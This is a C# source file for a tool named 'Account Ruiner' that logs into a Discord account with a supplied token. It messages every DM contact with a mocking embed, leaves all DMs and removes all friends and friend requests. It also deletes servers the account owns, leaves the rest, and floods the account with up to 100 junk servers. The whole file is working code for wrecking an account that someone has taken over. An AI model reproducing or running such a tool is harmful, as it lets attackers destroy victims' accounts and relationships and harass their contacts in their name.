using Discord;
using Discord.Gateway;
using System;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace AccountRuiner
{
    class Program
    {

        static void Main()
        {
        menu:
            Console.Clear();
            Console.Title = "Justhideme's Account Ruiner, and Jenz (For Helping)";
            Console.WriteLine($"Welcome to {Console.Title}\nInspired by iLinked\nPowered By Anarchy\nPlease Enter Token:");
            string token = Console.ReadLine();
            DiscordSocketClient client = new DiscordSocketClient();
            client.OnLoggedIn += Client_OnLoggedIn;
            try
            {
                client.Login(token);
                Console.Clear();
                Thread.Sleep(-1);
            }
            catch (Exception)
            {
                Console.Clear();
                Console.WriteLine("Invalid Token!");
                Console.ReadLine();
                goto menu;
            }
        }

        private static void Client_OnLoggedIn(DiscordSocketClient client, LoginEventArgs args)
        {
            Console.WriteLine("How Many Guilds? (Max is 100)");
            int guilds = int.Parse(Console.ReadLine());
            Console.Clear();
            Console.WriteLine("Press Enter When Ready");
            Console.ReadLine();
            Console.Clear();

            foreach (var dm in client.GetPrivateChannels())
            {
                try
                {
                    dm.TriggerTyping();
                    EmbedMaker embed = new EmbedMaker
                    {
                        Title = "ALL HAIL ANARCHY!",
                        Description = "I just got riggity rekked!\nI got the big gay! LOL!\nTEOTFW Best Show",
                        Color = Color.FromArgb(0, 204, 255),
                        TitleUrl = "https://paypal.me/imtoopoorlol",
                        ImageUrl = "https://cdn.discordapp.com/attachments/622851297607155722/627651954499387411/u_wot.jpg",
                        ThumbnailUrl = "https://cdn.discordapp.com/attachments/619273995681923092/627652607392874515/norfolk-terrier-i2.jpg"
                    };
                    embed.Footer.Text = "Made by JustHideMe & Jenz!";
                    embed.Footer.IconUrl = "https://cdn.discordapp.com/attachments/624408319372820500/627529053884383240/Anarchy.png";
                    dm.SendMessage("BOOF!", false, embed);
                }
                catch (Exception) { }
                
                Console.WriteLine("Leaving DMs...");
                dm.Leave();

                Thread.Sleep(100);
            }

            foreach (var relationship in args.Relationships)
            {
                if (relationship.Type == RelationshipType.Friends)
                    relationship.Remove();
                Console.WriteLine("Removing Friends...");

                if (relationship.Type == RelationshipType.IncomingRequest)
                    relationship.Remove();
                Console.WriteLine("Removing Incoming Friend Req's");

                if (relationship.Type == RelationshipType.OutgoingRequest)
                    relationship.Remove();
                Console.WriteLine("Removing Outgoing Friend Req's");

            }


            foreach (var guild in client.GetGuilds())
            {
                try
                {
                    if (guild.Owner)
                        guild.Delete();

                    else
                        guild.Leave();
                    Console.WriteLine($"Left {guild}");

                    Thread.Sleep(100);

                }
                catch { }
            }

            WebClient wc = new WebClient();
            wc.DownloadFile("https://cdn.discordapp.com/attachments/624408319372820500/627529053884383240/Anarchy.png", "face.png");
            wc.Dispose();

            for (int i = 1; i <= guilds; i++)
            {
                client.CreateGuild("Get Rekked. lol", Image.FromFile("face.png"), "russia");
                Console.WriteLine("Made {0} Guilds...", i);
            }
            Console.WriteLine("DONE! You Can Now Close The Program");
        }
    }
}